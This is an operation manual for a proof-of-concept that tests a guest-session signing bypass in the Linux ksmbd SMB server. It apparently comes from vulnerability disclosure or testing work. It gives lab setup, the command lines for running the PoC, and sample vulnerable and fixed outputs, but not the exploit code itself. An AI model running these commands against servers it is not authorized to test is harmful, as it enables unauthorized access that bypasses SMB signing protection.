# Operation Manual

## Scope

Use this PoC only in an authorized lab. It performs a minimal SMB2 handshake and
does not write files, but it does attempt to establish a guest session.

## Preconditions

Prepare a ksmbd test server with:

- the kernel built with ksmbd enabled;
- `ksmbd.mountd` or equivalent userspace daemon running;
- server signing configured as mandatory;
- a guest/anonymous mapping for the username used by the PoC, for example
  `guest`;
- optional: a guest-accessible share to prove an unsigned follow-up request is
  accepted.

The exact ksmbd-tools configuration syntax can vary by version. The important
observable precondition is that the SMB2 NEGOTIATE response has
`SMB2_NEGOTIATE_SIGNING_REQUIRED` set. The PoC prints this as:

```text
server_requires_signing=True
```

If it prints `False`, fix the server signing configuration before interpreting
the result.

## Running the PoC

From this directory:

```sh
python3 poc_ksmbd_guest_signing_bypass.py <server-ip> -u guest
```

With a guest-readable share:

```sh
python3 poc_ksmbd_guest_signing_bypass.py <server-ip> -u guest --share public
```

If the tree-connect UNC path needs a different server component than the target
IP, pass it explicitly:

```sh
python3 poc_ksmbd_guest_signing_bypass.py <server-ip> -u guest --tree-server KSMBD --share public
```

For a non-standard SMB port:

```sh
python3 poc_ksmbd_guest_signing_bypass.py <server-ip> -p 1445 -u guest --share public
```

## Vulnerable result

A vulnerable server produces output like:

```text
[+] NEGOTIATE dialect=0x0300 security_mode=0x0003
[+] server_requires_signing=True
[+] NTLMSSP_NEGOTIATE status=STATUS_MORE_PROCESSING_REQUIRED session_id=0x...
[+] NTLMSSP_AUTH status=STATUS_SUCCESS session_id=0x... session_flags=0x0001 signed=False
[!] VULNERABLE: mandatory signing was advertised, but guest session setup succeeded unsigned.
```

If `--share` is supplied and access is allowed, the strongest confirmation is:

```text
[+] TREE_CONNECT status=STATUS_SUCCESS tree_id=0x... signed=False
[!] VULNERABLE: unsigned TREE_CONNECT also succeeded on the guest session.
```

## Fixed or not triggered

Typical fixed behavior:

```text
[+] server_requires_signing=True
[+] NTLMSSP_AUTH status=STATUS_LOGON_FAILURE ...
[+] NOT VULNERABLE: server rejected guest/null authentication while signing is required.
```

Common inconclusive cases:

- `server_requires_signing=False`: the server is not enforcing signing.
- `session_flags` does not include `0x0001`: the supplied username did not map
  to guest; adjust `--user` or the daemon guest mapping.
- authentication fails before guest mapping: verify daemon user/share setup.

## Notes

The PoC offers SMB 2.0.2, SMB 2.1, and SMB 3.0, but intentionally does not
offer SMB 3.1.1. This avoids SMB 3.1.1's special final SESSION_SETUP response
signing path and directly tests whether the guest session inherits mandatory
server signing.
